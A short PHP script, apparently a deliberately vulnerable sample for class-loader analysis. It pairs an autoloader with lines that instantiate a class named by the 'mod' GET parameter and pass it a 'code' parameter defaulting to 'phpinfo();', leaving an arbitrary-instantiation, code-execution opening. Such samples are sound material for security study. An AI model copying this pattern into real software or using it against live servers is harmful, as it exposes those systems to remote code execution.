<?php
/* 
 * 类加载器分析
 */
function z_autoload($classname) {
	// Can't use __DIR__ as it's only in PHP 5.3+
	$filename = 'lib.' . $classname . '.php';
	if (is_readable ( $filename )) {
		require $filename;
	}
}
if (version_compare ( PHP_VERSION, '5.1.2', '>=' )) {
	// SPL autoloading was introduced in PHP 5.1.2
	if (version_compare ( PHP_VERSION, '5.3.0', '>=' )) {
		spl_autoload_register ( 'z_autoload', true, true );
	} else {
		spl_autoload_register ( 'z_autoload' );
	}
} else {
	/**
	 * Fall back to traditional autoload for old PHP versions
	 * 
	 * @param string $classname
	 *        	The name of the class to load
	 */
	function __autoload($classname) {
		z_autoload ( $classname );
	}
}
$mod = isset($_GET['mod'])?$_GET['mod']:'index';
$code = isset($_GET['code'])?$_GET['code']:'phpinfo();';

$obj = new $mod($code);
